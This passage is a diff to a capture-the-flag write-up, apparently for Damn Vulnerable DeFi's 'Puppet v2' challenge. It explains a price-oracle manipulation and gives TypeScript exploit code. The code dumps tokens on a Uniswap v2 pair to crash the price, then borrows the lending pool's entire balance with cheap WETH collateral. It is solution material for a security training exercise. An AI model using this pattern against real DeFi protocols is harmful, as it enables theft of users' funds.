@@ -154,6 +154,32 @@ Then, when the price is low enough, we can borrow all the tokens from the pool f
 
 ## 9 - Puppet v2
 
+This challenge has the same issues as the previous one. The price from the pool relies on a single oracle that can be attacked to change the price.
+
+The attack is the same as in the previous challenge, but instead of interacting with Uniswap v1, in this case its v2:
+
+```typescript
+await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+
+await this.uniswapRouter
+  .connect(attacker)
+  .swapExactTokensForETH(
+    ATTACKER_INITIAL_TOKEN_BALANCE,
+    0,
+    [this.token.address, this.weth.address],
+    attacker.address,
+    deadline,
+    { gasLimit: 1e6 },
+  );
+
+const tokens = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+await this.weth.connect(attacker).deposit({ value: tokens });
+await this.weth.connect(attacker).approve(this.lendingPool.address, tokens);
+
+await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+```
+
 [Test](./test/puppet-v2/puppet-v2.challenge.ts)
 
 ## 10 - Free rider
